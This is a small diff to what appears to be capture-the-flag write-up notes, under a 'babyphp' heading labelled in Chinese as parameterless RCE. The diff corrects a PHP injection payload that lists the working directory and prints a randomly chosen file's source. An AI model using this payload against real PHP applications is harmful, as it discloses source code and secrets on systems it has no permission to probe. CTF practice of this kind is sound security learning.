@@ -1,7 +1,7 @@
 # web
 ### babyphp
 #无参rce 
-`commandshow_source(array_rand(array_flip(scandir(getcwd()))));`
+`command=show_source(array_rand(array_flip(scandir(getcwd()))));`
 
 
 ### pain
